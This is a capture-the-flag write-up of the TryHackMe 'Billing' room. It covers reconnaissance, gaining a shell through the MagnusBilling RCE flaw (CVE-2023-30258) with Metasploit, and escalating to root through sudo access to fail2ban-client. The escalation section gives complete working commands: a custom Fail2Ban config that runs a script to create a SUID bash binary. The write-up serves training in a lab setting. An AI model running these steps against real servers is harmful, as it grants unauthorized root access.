# Billing TryHackMe Write-up

<img width="200" height="200" alt="618b3fa52f0acc0061fb0172-1741192887584" src="https://github.com/user-attachments/assets/96432dd8-3080-41ae-8b7f-4689a739c3af" />

**Difficulty:** Easy  
**Access:** Free  
**Room Link:** https://tryhackme.com/room/billing 

Gain a shell, find the way, and escalate your privileges!

**Note:** Bruteforcing is out of scope for this room.

---

## Recon

With the Nmap scan, there are 4 ports open, including MySQL on 3306 and Asterisk Call Manager on 5083.

<img width="922" height="790" alt="nmap-scan " src="https://github.com/user-attachments/assets/19c19e82-7ca6-43df-979d-f7bbad3a1e51" />


There is also a `robots.txt` file which disallows entry at `_/mbilling/`.

Let’s open the site on port 80. We get a login page at `/mbilling`.

<img width="1918" height="912" alt="billing page " src="https://github.com/user-attachments/assets/5fd4eedc-8441-4114-b6bc-d708351d7bcb" />


Look at the site title, which shows **"MagnusBilling"**.

<img width="1750" height="903" alt="magnus billing " src="https://github.com/user-attachments/assets/7b06525b-2d78-47c8-a0a0-5f8eddbe5c59" />


After some web searching, we found that MagnusBilling is vulnerable to a critical unauthenticated Remote Code Execution (RCE) flaw identified as **CVE-2023-30258**.

https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/

We can use this exploit in Metasploit and get a shell as `asterisk`.

<img width="1432" height="788" alt="metasploit- rce" src="https://github.com/user-attachments/assets/43f35944-0ee9-4160-aa3c-59817055e640" />

We found the exploit, so let’s set it up.

<img width="1308" height="572" alt="get-shell" src="https://github.com/user-attachments/assets/5da74241-c9e2-45a1-9d0b-1ece7532673d" />

Now let’s upgrade the shell and look for the user flag:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<img width="745" height="322" alt="user-flag" src="https://github.com/user-attachments/assets/10ee155b-dd01-4585-9ccb-46a0f3cc94d3" />


---

## Privilege Escalation

For the root flag, let’s check the permissions of user `asterisk`:

<img width="1077" height="317" alt="sudo -perm" src="https://github.com/user-attachments/assets/2d22bb1f-d132-4d44-b82d-0bdcada791fe" />


The user can run `sudo -l` without a password and has access to the following binary as root:

```
/usr/bin/fail2ban-client
```

Fail2Ban is an open-source, Python-based intrusion prevention framework that protects Linux servers from brute-force attacks and unauthorized access by monitoring system logs (e.g., `/var/log/auth.log`). It automatically updates firewall rules (such as iptables or nftables) to temporarily or permanently ban IP addresses that exhibit suspicious behavior, like too many failed password attempts.

The following resource explains how Fail2Ban works and how it can be exploited:

https://juggernaut-sec.com/fail2ban-lpe/

Using that resource, we can create our own configuration files and force Fail2Ban to execute our script.

---

## Exploit Steps

First, copy the original Fail2Ban configuration:

```bash
rsync -av /etc/fail2ban/ /tmp/fail2ban/
```

Create a script that spawns an SUID bash binary:

```bash
cat > /tmp/script <<EOF
#!/bin/sh
cp /bin/bash /tmp/bash
chmod 755 /tmp/bash
chmod u+s /tmp/bash
EOF

chmod +x /tmp/script
```

Create a custom action file:

```bash
cat > /tmp/fail2ban/action.d/custom-start-command.conf <<EOF
[Definition]
actionstart = /tmp/script
EOF
```

Enable the custom jail:

```bash
cat >> /tmp/fail2ban/jail.local <<EOF
[my-custom-jail]
enabled = true
action = custom-start-command
EOF
```

Create an empty filter file:

```bash
cat > /tmp/fail2ban/filter.d/my-custom-jail.conf <<EOF
[Definition]
EOF
```

Restart Fail2Ban using our custom configuration:

```bash
sudo fail2ban-client -c /tmp/fail2ban/ -v restart
```

---

## How It Works

- `rsync` copies the original Fail2Ban files from `/etc/fail2ban/` to `/tmp/fail2ban/`
- We created `/tmp/script`, which spawns a SUID bash binary at `/tmp/bash`
- A custom action configuration is added to execute this script
- The `-c` option forces `fail2ban-client` to load our modified configuration from `/tmp/fail2ban/`
- This results in a SUID bash binary being created

Finally, we get root by running:

```bash
/tmp/./bash -p
```

<img width="811" height="345" alt="root-flag" src="https://github.com/user-attachments/assets/c65d8b86-5844-411b-8589-143329367f1b" />


---

## Author

**Akshay Sutariya**

- TryHackMe: https://tryhackme.com/p/mrAkki  
- LinkedIn: https://www.linkedin.com/in/akshay-sutariya2404/  
